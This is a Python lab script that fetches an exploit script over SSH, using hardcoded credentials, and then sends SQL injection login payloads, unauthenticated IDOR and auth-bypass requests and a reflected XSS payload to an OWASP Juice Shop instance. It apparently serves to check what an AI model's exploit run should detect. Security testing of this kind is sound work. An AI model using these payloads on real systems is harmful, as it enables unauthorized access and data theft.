#!/usr/bin/env python3
"""
Pull last exploit script + manually probe JuiceShop to find exact response format.
"""
import paramiko, urllib.request, urllib.error, json

LAB = "192.168.2.69"; USER = "ego"; PASS = "ego"
JUICE = "http://192.168.2.69:3000"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(LAB, username=USER, password=PASS, timeout=10,
               look_for_keys=False, allow_agent=False)

_, out, _ = client.exec_command("cat /tmp/sabrina_exploit_current.py")
script = out.read().decode("utf-8", errors="replace")
print("=== LAST EXPLOIT SCRIPT ===")
print(script)
client.close()

# Now manually probe JuiceShop to see what the model SHOULD detect
print("\n" + "="*60)
print("  MANUAL JUICESHOP PROBE RESULTS")
print("="*60)

def probe(label, url, method="GET", data=None, headers=None):
    hdrs = {"Content-Type": "application/json", "User-Agent": "Security-Research"}
    if headers: hdrs.update(headers)
    body = json.dumps(data).encode() if data else None
    req = urllib.request.Request(url, data=body, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            resp_body = r.read().decode("utf-8", errors="replace")
            print(f"\n[{label}] HTTP {r.status}")
            print(f"  Body[:200]: {resp_body[:200]}")
            return r.status, resp_body
    except urllib.error.HTTPError as e:
        resp_body = e.read().decode("utf-8", errors="replace")
        print(f"\n[{label}] HTTP {e.code}")
        print(f"  Body[:200]: {resp_body[:200]}")
        return e.code, resp_body

# SQLi tests — what does the login endpoint actually return?
probe("SQLi: admin'--",     f"{JUICE}/rest/user/login", "POST",
      {"email": "admin'--", "password": "x"})
probe("SQLi: ' OR 1=1--",   f"{JUICE}/rest/user/login", "POST",
      {"email": "' OR 1=1--", "password": "x"})
probe("SQLi: OR 1=1 json",  f"{JUICE}/rest/user/login", "POST",
      {"email": "' OR '1'='1", "password": "x"})

# IDOR — what does /api/Users/1 return unauthenticated?
probe("IDOR: /api/Users/1 (no auth)", f"{JUICE}/api/Users/1")

# Auth bypass
probe("Auth: /rest/user/whoami", f"{JUICE}/rest/user/whoami")
probe("Auth: /api/Users (no auth)", f"{JUICE}/api/Users")

# XSS
probe("XSS: search reflected?",
      f"{JUICE}/rest/products/search?q=<script>alert(1)</script>")
